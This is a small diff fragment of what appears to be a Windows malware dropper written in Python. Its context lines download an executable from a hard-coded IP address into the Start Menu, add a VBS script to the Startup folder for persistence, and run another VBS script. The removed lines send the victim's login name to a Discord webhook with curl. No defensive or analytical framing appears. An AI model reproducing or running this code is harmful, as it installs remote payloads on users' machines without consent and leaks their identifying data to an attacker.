@@ -19,9 +19,6 @@ if os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\St
     "http://20.93.23.234:8081/dl/runtime" "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\
     \Start Menu\\Programs\\System64\\Runtime.exe" \nstart "" "C:\\Users\\{login}\\AppData\\Roaming\
     \Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WIN64.vbs"''')
-    aha = '{"\\"username\\": \\"test\\", \\"content\\":\\"' + login + '\\"}"'
-    curl_command = f'curl -H "Content-Type: application/json" -d {aha} https://canary.discord.com/api/webhooks/...'
-    os.system(curl_command)
     subprocess.run(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
     \System64\\WIN32.vbs", shell=True, check=True)
 else:   
